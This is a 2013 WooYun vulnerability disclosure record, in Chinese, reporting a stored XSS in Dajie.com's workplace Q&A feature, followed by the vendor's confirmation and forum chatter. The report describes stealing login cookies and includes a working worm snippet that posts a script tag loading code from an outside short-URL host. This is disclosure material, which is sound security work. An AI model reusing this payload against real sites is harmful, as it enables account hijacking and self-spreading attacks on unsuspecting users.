{"id": 14388, "wybug_id": "wooyun-2013-017244", "wybug_title": "大街网某功能储存型XSS，导致可以在首页等位置蠕虫 + 盗取用户登录cookie", "wybug_corp": "大杰世纪科技发展（北京）有限公司", "wybug_author": "px1624", "wybug_date": "2013-01-13 12:18", "wybug_open_date": "2013-02-27 12:18", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "蠕虫"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-27：\t细节向公众公开  简要描述： 之前发了个大街网非你莫属官网的漏洞，给送礼物了，还打电话表示感谢（开始电话号码写错了，打到别人那去了，悲催），很开心。就去再转了转，就又挖到了一个，这个比之前那个危害严重很多。很多位置有显示，消息会以多种途径推送给好友，也会随机显示在板块主页和大街网首页，导致其他用户中招。可以蠕虫，可以盗取cookie，很霸气啊！ 详细说明：  大街网职场真心话功能存在xss，可以盗号，蠕虫等。此处有对\",<,>进行过滤，但是过滤的不彻底，只要构成原标签对闭合即可绕过。1 大街网 职场真心话 功能存在xss，\",<,>都没过滤，就随便构造了下，位置在插图的src处。（因为限制了长度，而且判断了图片的域名，所以这里插入代码后，部分图片不能正常加载）图1\n\n2 构造的恶意代码。图2\n\n3 盗取的cookie。图3\n\n\n\n4 随便拿一个cookie，并成功登录证明下。图4\n\n5 另外需要说明，这个职场真心话的图片也会在大街网首页显示，也会在职场真心话板块首页显示，而且会以新鲜事以及短消息的形式推送给好友（直接登录后的网站首页就可以看到新鲜事消息），所以危害还是蛮大的。\n\n6 下面做一下蠕虫的演示。7 缺陷位置图1\n\n8 用小号1登录，抓包后修改post数据，插入的恶意代码，由于第二个图片是在好友那里推送显示的，所以不做更改。写好之后就用charles提交一条恶意带有蠕虫的提问消息。图2\n\n9 换小号2登录，可以看到通过这个代码，好友小号2看到的消息直接在首页显示，并且完全无异样。图3\n\n10 点击进去，就中招了，用F12看到代码没有过滤（复制到txt中看的）。图4\n\n11 可以小号2在神不知鬼不觉的情况下已经发了一条和小号1一样的带有蠕虫的提问消息。图5\n\n12 再用小号1登录去看，和上面一样也是完美显示的。图6\n\n13 下面是自己写的一段简单的蠕虫代码（由于post数据没有加密参数，以及网站使用了jq，所以写起来很简单）\nfunction test(){\tjQuery.post(\"http://ox.dajie.com/question.do?m=ask\",{\t\"ajax\":\"1\",\t\"sexual\":\"0\",\t\"portraiturl\":\"><script src=//url.cn/BY3LeX></script><img \",\t\"portraithumburl\":\"/2013/01/12/676e/6969/6e67597a/480963/2757997309101287.120120.png\",\t\"content\":\"漂亮不？\",\t\"catalog\":\"1\",\t\"share\":\"\",\t\t\"huacao\":\"\"\t})}test()\n当然我测试的时候是有控制两个小号的ID的。最后，贵公司之前送的礼物偶很喜欢，如果这次给送礼物的话，就不要送咖啡壶了，已经有了，嘿嘿。。。最后，可能有人会感觉这个帖子描述的挺啰嗦的，的确是哦，因为第一次写的貌似太简单（只证明了可以盗取cookie），也没有证明蠕虫危害，所以十几天了一直没给审核，所以就重新详细描述证明后再提交了，剑心看到之后要给通过啊！插这么多图片不容易诶。。。ps 乌云的传图功能真心蛋疼啊，图多了，很容易就会凌乱的。   漏洞证明：  如上描述，分别证明了盗号登录，以及蠕虫。ps 礼物就是动力。   修复方案：  过滤特殊字符   版权声明：转载请注明来源 px1624@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2013-01-15 09:49 厂商回复： 我们已经着手处理，希望您今后继续支持大街网。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-13 12:36 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  霸气。    \n     2013-01-13 12:45 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @鬼魅羊羔 。。。目前的目标，rank超过你。。    \n     2013-01-13 12:53 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @px1624 晕死。。超过有什么用啊，充其量也就多买几个平台激活码，没什么意义啊。。    \n     2013-01-13 13:04 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @鬼魅羊羔 这是一种信念，ps WB很值钱的、、    \n     2013-01-13 13:26 |    \t\t1ee \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:14        | 看书中....)\t\t \n  @px1624 - -我还是觉的目前看书重要些    \n     2013-01-13 13:28 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @1ee 诶，看书是重要诶，基础扎实的话，实践起来很流畅的。我属于半路子的编程人员、、、业余爱好，菜鸟一个，呵呵    \n     2013-01-13 13:29 |    \t\t1ee \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:14        | 看书中....)\t\t \n  @px1624 我也一样，半桶水而已，所以看书为主，请问你现在工作了 还是学生？    \n     2013-01-13 13:40 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @1ee 12年刚毕业，目前工作快半年了。    \n     2013-01-13 13:40 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @1ee 你应该还在上学吧，上学就多看些，多学下，上学还是很好的，一天么啥压力。    \n     2013-01-13 15:51 |    \t\t1ee \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:14        | 看书中....)\t\t \n  @px1624 呵呵，是啊，学校不给压力的    \n     2013-01-13 17:11 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @1ee 啥专业的，大几了、、    \n     2013-01-15 12:48 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @鬼魅羊羔 擦，还差31rank才能赶上诶、、    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}